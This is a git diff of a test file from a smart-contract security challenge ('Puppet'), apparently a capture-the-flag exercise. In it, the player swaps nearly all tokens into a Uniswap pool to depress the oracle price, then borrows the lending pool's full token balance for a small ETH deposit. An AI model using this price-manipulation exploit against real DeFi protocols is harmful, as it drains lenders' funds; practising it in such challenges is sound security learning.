@@ -113,48 +113,48 @@ describe("[Challenge] Puppet", function () {
 
   it("Execution", async function () {
     /** CODE YOUR SOLUTION HERE */
-    const puppetHack = await (
-      await ethers.getContractFactory("PuppetHack", player)
-    ).deploy(
-      token.address,
-      uniswapExchange.address,
-      lendingPool.address
-      // PLAYER_INITIAL_TOKEN_BALANCE,
-      // POOL_INITIAL_TOKEN_BALANCE
-      // { value: ethers.utils.parseEther("15") }
-    );
-    // await token
-    //   .connect(player)
-    //   .transfer(puppetHack.address, PLAYER_INITIAL_TOKEN_BALANCE);
-    await puppetHack.attack();
-
-    // // connecting attacker to contracts
-    // const attackToken = token.connect(player);
-    // const attackUniswapExchange = uniswapExchange.connect(player);
-    // const attackLendingPool = lendingPool.connect(player);
-    // // approve token spending here
-    // await attackToken.approve(
+    // const puppetHack = await (
+    //   await ethers.getContractFactory("PuppetHack", player)
+    // ).deploy(
+    //   token.address,
     //   uniswapExchange.address,
-    //   PLAYER_INITIAL_TOKEN_BALANCE
+    //   lendingPool.address,
+    //   // PLAYER_INITIAL_TOKEN_BALANCE,
+    //   // POOL_INITIAL_TOKEN_BALANCE
+    //   { value: ethers.utils.parseEther("24") }
     // );
-    // // swapping all tokens for ETH to manipulate price
-    // await attackUniswapExchange.tokenToEthSwapInput(
-    //   PLAYER_INITIAL_TOKEN_BALANCE - 1n, // to satisfy condition //FIX HERE
-    //   1, // any ETH to get back is ok
-    //   9999999999 // any deadline will do
-    // );
-    // const deposit = await lendingPool.calculateDepositRequired(
-    //   POOL_INITIAL_TOKEN_BALANCE
-    // );
-    // console.log(
-    //   `Deposit Required: ${deposit} wei or ${ethers.utils.formatEther(
-    //     deposit.toString()
-    //   )} ETH`
-    // );
-    // // barrowing all the tokens with our ETH
-    // await attackLendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE, player.address, {
-    //   value: deposit,
-    // });
+    // // await token
+    // //   .connect(player)
+    // //   .transfer(puppetHack.address, PLAYER_INITIAL_TOKEN_BALANCE);
+    // await puppetHack.connect(player).attack();
+
+    // connecting attacker to contracts
+    const attackToken = token.connect(player);
+    const attackUniswapExchange = uniswapExchange.connect(player);
+    const attackLendingPool = lendingPool.connect(player);
+    // approve token spending here
+    await attackToken.approve(
+      uniswapExchange.address,
+      PLAYER_INITIAL_TOKEN_BALANCE
+    );
+    // swapping all tokens for ETH to manipulate price
+    await attackUniswapExchange.tokenToEthSwapInput(
+      PLAYER_INITIAL_TOKEN_BALANCE - 1n, // to satisfy condition //FIX HERE
+      1, // any ETH to get back is ok
+      9999999999 // any deadline will do
+    );
+    const deposit = await lendingPool.calculateDepositRequired(
+      POOL_INITIAL_TOKEN_BALANCE
+    );
+    console.log(
+      `Deposit Required: ${deposit} wei or ${ethers.utils.formatEther(
+        deposit.toString()
+      )} ETH`
+    );
+    // barrowing all the tokens with our ETH
+    await attackLendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE, player.address, {
+      value: deposit,
+    });
   });
 
   after(async function () {
